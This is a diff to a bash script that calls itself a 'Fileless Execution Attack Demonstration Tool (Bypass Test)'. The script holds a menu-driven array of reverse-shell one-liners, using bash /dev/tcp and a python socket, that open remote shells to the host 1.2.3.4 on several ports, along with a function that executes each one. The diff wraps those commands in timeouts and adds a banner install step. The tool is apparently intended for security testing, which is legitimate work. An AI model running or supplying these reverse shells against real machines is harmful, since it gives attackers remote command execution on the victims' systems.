@@ -1,23 +1,23 @@
 #!/bin/bash
 
-# === Title ===
+# === Requirements ===
+if ! command -v figlet >/dev/null; then
+  echo "Installing figlet for banner..."
+  apt-get install -y figlet &>/dev/null || yum install -y figlet &>/dev/null
+fi
+
+# === Colored Title ===
 echo -e "\e[1;31m"
-echo "███████╗██╗██╗     ███████╗██╗     ███████╗███████╗███████╗███████╗"
-echo "██╔════╝██║██║     ██╔════╝██║     ██╔════╝██╔════╝██╔════╝██╔════╝"
-echo "███████╗██║██║     █████╗  ██║     █████╗  ███████╗███████╗███████╗"
-echo "╚════██║██║██║     ██╔══╝  ██║     ██╔══╝  ╚════██║╚════██║╚════██║"
-echo "███████║██║███████╗███████╗███████╗███████╗███████║███████║███████║"
-echo "╚══════╝╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝"
-echo -e "\e[0m"
-echo -e "\e[1;32m      Fileless Execution Attack Demonstration Tool (Bypass Test)\e[0m"
+figlet FILELESS
+echo -e "\e[0m\e[1;32m      Fileless Execution Attack Demonstration Tool (Bypass Test)\e[0m"
 echo
 
 # === Attack Arrays ===
 reverse_shells=(
-"bash -c 'exec 5<>/dev/tcp/1.2.3.4/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done'"
-"bash -c 'exec \${FD:-5}<>/dev/tcp/1.2.3.4/5555; while read -r line <&\${FD}; do bash -c \"\$line\" 2>&\${FD} >&\${FD}; done'"
-"exec 16< <(bash -c 'bash -i >& /dev/tcp/1.2.3.4/9001 0>&1'); bash /proc/self/fd/16"
-"exec 17< <(python3 -c \"import socket,os;s=socket.socket();s.connect(('1.2.3.4',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execvp('bash',['bash'])\"); bash /proc/self/fd/17"
+"timeout 5 bash -c 'exec 5<>/dev/tcp/1.2.3.4/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done'"
+"timeout 5 bash -c 'exec \${FD:-5}<>/dev/tcp/1.2.3.4/5555; while read -r line <&\${FD}; do bash -c \"\$line\" 2>&\${FD} >&\${FD}; done'"
+"timeout 5 bash -c 'bash -i >& /dev/tcp/1.2.3.4/9001 0>&1'"
+"timeout 5 python3 -c \"import socket,os;s=socket.socket();s.connect(('1.2.3.4',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execvp('bash',['bash'])\""
 )
 
 curl_based=(
@@ -57,6 +57,7 @@ echo "4) Encoded Payloads"
 echo "5) Run ALL Attacks"
 read -p $'\nSelect option [1-5]: ' choice
 
+# === Execution Function ===
 run_attacks() {
   local -n arr=$1
   for cmd in "${arr[@]}"; do
@@ -65,8 +66,8 @@ run_attacks() {
   done
 }
 
+# === Run Based on Choice ===
 echo
-
 case $choice in
   1) run_attacks reverse_shells ;;
   2) run_attacks curl_based ;;
